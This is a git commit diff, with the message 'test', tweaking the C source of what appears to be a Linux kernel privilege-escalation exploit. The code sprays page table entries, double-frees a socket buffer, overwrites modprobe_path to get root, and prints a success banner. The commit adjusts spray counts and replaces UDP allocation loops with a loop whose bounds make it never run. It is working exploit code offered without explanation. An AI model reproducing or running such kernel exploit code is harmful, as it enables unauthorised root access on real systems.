a95cf0da587c3e45c3007858cf020645fe006ed9
Willenst <willenst@gmail.com>
2024-11-07 01:27:42 +0200

    test

--- src/main.c
+++ src/main.c
@@ -328,7 +328,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 	// spray-allocate the PTEs from PCP allocator order-0 list
 	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
-	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
+	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT-2000; i++)
 		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
 
 	PRINTF_VERBOSE("[*] double-freeing skb...\n");
@@ -466,11 +466,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 						PRINTF_VERBOSE("[+] overwriting modprobe_path with different PIDs (%u-%u)...\n", pid_guess, pid_guess + 50);
 						PRINTF_VERBOSE("    - i.e. '%s' @ %p...\n", (char*)pmd_modprobe_addr, pmd_modprobe_addr);
 						PRINTF_VERBOSE("    - matching modprobe_path scan var: '%s' @ %p)...\n", modprobe_path, modprobe_path);
-						for (int i=0; i < 100; i++)
-							{
-								//PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, 100);
-								alloc_ipv4_udp(1);
-							}
 					}
 						
 					lseek(modprobe_script_fd, 0, SEEK_SET); // overwrite previous entry
@@ -485,11 +480,9 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 					if (status_cnt == 0)
 						continue;
 
-					for (int i=0; i < 100; i++)
-							{
-								PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, 100);
-								alloc_ipv4_udp(1);
-							}
+					for (unsigned long long i=CONFIG_PTE_SPRAY_AMOUNT; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
+						*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
+
 
 
 					printf("[+] successfully breached the mainframe as real-PID %u\n", pid_guess);
